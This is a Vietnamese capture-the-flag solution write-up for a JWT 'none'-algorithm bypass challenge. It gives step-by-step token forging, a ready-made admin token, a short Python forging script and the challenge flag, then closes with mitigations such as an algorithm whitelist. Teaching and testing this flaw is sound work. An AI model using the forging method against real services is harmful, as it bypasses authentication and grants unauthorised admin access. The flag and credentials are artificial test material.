# Thử thách 11: JWTCafe - Giải pháp

## Loại lỗ hổng
**JWT Algorithm Confusion / "none" Algorithm Bypass (Khai thác lỗ hổng thuật toán JWT None)**

## Mô tả
Hệ thống chấp nhận các JSON Web Token (JWT) được ký với thuật toán `"none"`. Việc dùng thuật toán này đồng nghĩa với việc bỏ qua bước xác minh chữ ký (signature check), tạo điều kiện cho hacker giả mạo (forge) token và nâng quyền (Privilege Escalation).

## Mã nguồn chứa lỗ hổng
```javascript
// VULNERABLE: if alg=none, skip signature check
const role = payload.role;
// Không thực hiện việc xác thực chữ ký khi alg="none"
```

## Khai thác (Exploit)

1. Đăng nhập bằng tài khoản: `guest` / `guest123`
2. Lưu lại chuỗi JWT token trong cookie hoặc session.
3. Giải mã JWT (Sử dụng trang `jwt.io` hoặc decode Base64):
   - Header: `{"alg":"HS256","typ":"JWT"}`
   - Payload: `{"sub":"guest","role":"guest","iat":...}`
4. Thay đổi nội dung JWT (Giả mạo Token):
   - Ở phần Header, đổi `alg` thành `"none"`.
   - Ở phần Payload, đổi `role` thành `"admin"`.
5. Encode lại Header và Payload bằng thuật toán Base64URL.
6. Xóa toàn bộ phần chữ ký cũ (tức là xóa sạch nội dung nằm sau dấu chấm thứ 2 của JWT).
7. Sử dụng JWT giả mạo này trong HTTP Request để truy cập vào endpoint `/menu` hoặc tính năng admin.

## Rèn JWT thủ công (Manual Forge)

**Cấu trúc JWT gốc:**
```text
header.payload.signature
```

**JWT giả mạo:**
```json
Header: {"alg":"none","typ":"JWT"}
Payload: {"sub":"guest","role":"admin","iat":1234567890}
```

**Mã hóa Base64URL:**
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTIzNDU2Nzg5MH0.
```
*(Lưu ý: Dấu chấm `.` ở cuối cùng được giữ lại để đánh dấu phần chữ ký rỗng).*

## Sử dụng Python
```python
import base64
import json

def base64url_encode(data):
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip('=')

header = json.dumps({"alg":"none","typ":"JWT"})
payload = json.dumps({"sub":"guest","role":"admin","iat":1234567890})

token = f"{base64url_encode(header)}.{base64url_encode(payload)}."
print(token)
```

## Flag
```
FCTF{jwt_n0n3_4lg_byp4ss}
```

## Cách hoạt động
- Một JSON Web Token (JWT) có 3 phần, cách nhau bởi dấu chấm: Header, Payload, Signature.
- Trường `alg` trong Header khai báo thuật toán mã hóa được sử dụng để ký chữ ký số.
- Spec của JWT quy định một thuật toán tên là `"none"` (không dùng chữ ký). 
- Do lỗi logic, các thư viện JWT kém chất lượng sẽ tin theo Header mà bỏ qua kiểm tra chữ ký nếu thấy `alg` là `"none"`.
- Kẻ tấn công có thể qua mặt hàng rào xác thực dễ dàng.

## Biện pháp phòng ngừa (Mitigation)
- Không bao giờ chấp nhận cấu hình thuật toán `alg: "none"` trong môi trường production.
- Luôn thiết lập rõ một Danh sách trắng (Whitelist) các thuật toán cho phép trên server:
  ```javascript
  const allowedAlgs = ['HS256', 'RS256'];
  if (!allowedAlgs.includes(header.alg)) {
      throw new Error('Invalid algorithm');
  }
  ```
- Sử dụng các thư viện JWT uy tín, luôn yêu cầu cung cấp Khóa Bí Mật (Secret Key) để buộc hàm verify phải chạy kiểm tra chữ ký.
- Quản lý Key một cách an toàn và thay Key (Key rotation) định kỳ.
- Nên ưu tiên các thuật toán bất đối xứng như `RS256`.
